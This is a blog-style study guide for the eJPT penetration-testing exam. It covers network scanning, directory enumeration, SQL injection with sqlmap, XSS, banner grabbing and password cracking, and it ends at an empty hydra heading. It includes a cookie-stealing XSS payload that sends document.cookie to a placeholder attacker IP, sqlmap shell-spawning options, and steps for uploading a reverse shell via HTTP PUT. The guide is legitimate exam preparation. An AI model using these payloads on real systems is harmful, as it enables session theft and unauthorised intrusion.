---
description: >-
  Written by Jacob Scheetz- July 2021. Find me on other socials, twitter:
  @FindingUrPasswd - LI: https://www.linkedin.com/in/jacobscheetz/
---

# Ultimate eJPT Guide; how to pass the eJPT

### What this guide is and what it isn't

Firstly, it's important to be clear what this guide is and what it is not. There are a lot of "braindumps" out there that you _could_ use. However, that is exactly what this guide is **NOT**. For those of you unfamiliar with what a braindump is- it is basically where someone sits for an exam and then immediately tries to regurgitate the material and answers onto a forum, website, or blog. Not only is this flat out against the purpose of certification exams but if you do this you're only cheating yourself from the knowledge you would have gained from just sitting down and learning the material. With that out of the way, let's get to what this post actually is and how it can help you. This post is meant to highlight things that I felt were particularly helpful or useful when looking back on my eJPT journey. I want everyone to experience that same feeling of accomplishment that I did when I passed my exam: 

![Me \(and hopefully you after you read this blog\) after passing my eJPT](../.gitbook/assets/tenor.gif)

### Background

To give you all some context for my competency level going into the eJPT- I was fairly confident with using linux and with security concepts before the eJPT. I had interned on a Security Incident Response team for two years, passed the security+, and got system owns on a handful of active boxes on HackTheBox. Having any experience is not required whatsoever, and quite honestly, if you put your mind to it and study then you don't need to have any experience to pass this. I don't bring up my experience to shy anyone away from taking the course- I'm mentioning this so that you can get a baseline for where this guide is coming from. The course that goes along with the exam, PTS from INE, is designed so that an absolute beginner could succeed as well. If you like to be more comfortable than ambitious with cert exams though I would say any combination of the security+, the beginer path on TryHackMe, and the PTS course from INE is plenty to get you comfortable and inline with where you should be to work the required tools and environment in the course. 

### Extra Resources

I will list some extra resources to look through that are by no means required, but could be helpful for someone wanting other places to look: 

For my readers out there: "Penetration Testing A Hands On Introduction to Hacking" by Georgia Weidman is a fantastic read. While some of the things can be outdated and out of the scope of the eJPT, you will learn enough from the book itself to absolutely smash the eJPT

For my video watchers: there aren't a lot of "great" video series to watch for this but John Hammond, IPPSec, and myself :\) fantastically cover HackTheBox walkthroughs for retired boxes on YouTube and those can be good to get you to understand the methodologies of compromising a machine. 

## Big Time Topics

In this section, I am going to present you with topics from the PTS course that are crucial to passing the exam- you may want to pay extra attention to learning these and learning them well. It will pay off! Note: the eJPT exam is _**VERY**_  heavily designed around the PTS course so I recommend that you learn any and all of the material from that and then return to this list for things to brush up on. At that point, you should be familiar with these terms, their meanings, the context, etc. and the list should a great compiled overview. 

### Networking

One thing to note here: if you don't have networking experience before taking this exam, please really pay attention to this stuff. 

**Route**

```bash
route
```

* identify the gateway for the network you're connected to

```bash
ip route add <x.x.x.0/24> via <y.y.y.y>
```

* add a route manually
* Where x is the currently unreachable IP and y is the IP of the gateway for that network



### Information Gathering / Enumeration 

This is the most important part of the penetration testing process- read and read well. It is very well put in the course: imagine your target is a dartboard and your attacks are the darts. You would much rather gather more information about the dartboard to make the surface area larger to ensure you cannot miss with your darts \(or attacks\) than have a really small dartboard and waste your time throwing darts trying to hit the target. 

**nslookup / whois**

```bash
nslookup example.com
```

```bash
nslookup 1.2.3.4
```

* nslookup can only be used on the domain of a site
  * ex. google.com works but google.com/blog does not

```bash
whois google.com
```

* same syntax here, just another option

**nmap**

I recommend creating directories for the results of nmap scans and utilizing the output capabilities to come back to these results later. nmap is extremely powerful in pentests and the results can provide highly valuable information

```bash
mkdir ./nmap
```

**nmap \(initial\)** 

```bash
nmap -sC -sV -v3 x.x.x.x -oN ./nmap/initial
```

* useful to get a good quick picture of the machine and see if there are any services running on some common ports

**nmap \(full\)** 

```bash
nmap -p- -v3 -A x.x.x.x -oN ./nmap/full
```

* useful to see anything that is running on a non-standard port
  * remember you can put any service on any port
  * ex. SSH does not have be running on port 22, it could very well be on port 4444

**nmap \(udp\)**

```bash
nmap -p- -sU -sV -sC -v3 x.x.x.x -oN ./nmap/udp
```

* You're also going to want to make sure all of your bases are covered and you can ensure nothing important is open on UDP as well

**nmap \(OS detection\)**

```bash
nmap -O -Pn -v3 x.x.x.x -oN ./nmap/os
```

* If you've already performed the other scans, the full scans should try to identify the host OS but sometimes it's worth a shot to just run a dedicated OS identification scan

**fping**

```bash
fping -a -g x.x.x.0/24 2>/dev/null
```

* performing a ping sweep to identify hosts on the network

### Web Attacks

You're almost certainly guaranteed to come across some form of web based application that can be attacked in this exam. Web applications are also one of the biggest attack surfaces in the real world as well, so begining to understand the concept of working with web technologies will serve you well. I highly recommend taking your time to work through this section of the course and become comfortable with the material and then revisiting it again once you're familiar with the terminology being used. 

#### **Hidden directory enumeration**

while the course introduces dirb and dirbuster- I would recommend gobuster or dirsearch. dirbuster is fine if you like a GUI but dirsearch will give you basically the same results and, in my opinion, is easier to use. Check it out here: [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

**Dirsearch**

```bash
python3 dirsearch.py -u <URL> -e <EXTENSIONS>
```

* quickly find the paths to hidden files, directories, etc on a domain
* I recommend looing for php, old, or conf extensions initially

**gobuster**

```bash
gobuster dir <url> -w <wordlist>
```

* gobuster is another fan favorite that is notorious for being quick

####  **SQL Injection \(SQLi\)**

sqli is another biggie here. I recommend really reading the ouput sqlmap and understanding what it is doing because testing sqli's by hand will always be necessary to validate what the tool discovers. sqlmap is a tool that is invaluable in your toolbelt solely based off the information it can provide to you if you know how to use it right. Half of the battle is identifying sql injection points so here is my thought process. 

1. Find points on the page that may need to query information stored somewhere else, like blog posts, articles, images, etc
2. click on the resource in question and then look for a parameter in the url or for a php page
   1. something alongs the lines of:
      1.  http://example.com/find.php?id=1234
3. once identified, use booleans after the operator to check the pages behavior
   1. http://example.com/find.php?id=1234' OR 1=2; -- -
4. If the output breaks then test a true condition:
   1. http://example.com/find.php?id=1234' OR 1=1; -- -
5. If the output comes back we have a sqli and can proceed to use tools to get further info

**sqlmap**

```bash
sqlmap --wizard
```

* can be used to help if you're struggling with the CLI, but I highly advise against getting comfortable with this. It doesn't provide the same level of customizability and it's widly inconveneient. 

```bash
sqlmap -u <url w/ parameter> 
```

* should validate the sqli and if vulnerable give us some system details as well

```bash
sqlmap -u <url w/ parameter> --tables
```

* this dumps the table

```bash
sqlmap -u <url w/ parameter> --current-db <database name> --dump
```

* dumps all of the contents of the tables in that database

```bash
sqlmap -u <url w/ parameter> [--os-shell] or [--os-pwn] 
```

* os-shell and os-pwn allow the user to try to open a backend shell or a meterpreter shell respectively

#### Cross-Site Scripting \(XSS\)

While this course doesn't present any tools for XSS, there are a few things to keep in mind:

* Persistent XSS: where the payloadd is embeded and stored on the page in some way shape or form. Think about someone posting a malicious payload into a tweet and then anytime anyone opens the tweet they are subject to malicious payload.
* Reflected XSS: the payload is carried in the input to the site. Think about encoding a malicious javascript snippet into a URL and then getting someone to click on the malicious link. 

Looking for XSS is a similar methodology to looking for SQLi, here are a few things that I look for:

1. identify input areas on a site, any spots where input could be potentially not sanitized
2. test input with html tags: &lt;h1&gt; Test &lt;/h1&gt;
3. test with javascript: 

```javascript
<script> alert('XSS'); </script> 
```

4. If this works then you can use the following js to steal cookies:

```javascript
<script> 
var i = new Image();
i.src = "http://your.own.IP.address/get.php?cookies=" += document.cookie;
</script>
```

* note, you would need to be hosting the corresponding get.php file on your own web server for that to work

#### **Banner Grabbing**

banner grabbing is the act of requesting the header information from a web application via an HTTP request to further enumerate what actions you can perform on the server. 

**netcat**

```javascript
nc -vv x.x.x.x 80
HEAD / HTTP/1.1
```

```javascript
nc -vv x.x.x.x 80
OPTIONS / HTTP/1.1
```

* make sure to hit \[return/enter\] twice after the HTTP verb line

**openssl**

this is used for the same purpose as netcat but for https commuincations that netcat does not support

```javascript
openssl s_client -connect x.x.x.x
HEAD / HTTP/1.1
```

```javascript
openssl s_client -connect x.x.x.x
OPTIONS / HTTP/1.1
```

**abusing HTTP verbs**

if the wrong http verbs are enabled for anyone by default, you can get away with a lot of things on a server- like uploading a reverse shell to the website. A trick for doing this is: 

* find reverse shell script from internet and adjust the IP and port

```javascript
wc rev-shell.php
> [#] rev-shell.php

nc -vv x.x.x.x 80
PUT /rev-shell.php
Content-type: text/html
Content-length: [#]
```

* where \[\#\] is the length that is output from the wc command initially

### System Attacks

there is a series of different styles of attacks you will need to know well on the system level. Being able to navigate metasploit well will absolutely serve you for the better so I recommend re-watching the meterpreter and metasploit videos from the PTS course. Additionally, I would also be comfortable with the idea of bruteforce attacks. 

**unshadow**

```javascript
unshadow passwd shadow > hashtocrack
```

* used on the shadow and passwd file to prepare it for a password attack tool like hashcat or john the ripper

**john the ripper \(john\)**

```javascript
john --wordlist <path to wordlist> hashfiletocrack
```

* a common wordlist to use is located in /usr/share/john/password.lst 
* I recommend [SecLists](https://github.com/danielmiessler/SecLists) on github for more password list options
  * once this is installed, you can find the new lists in /usr/share/seclists
* john --show hashes shows the cracked passwords

**hydra**







 

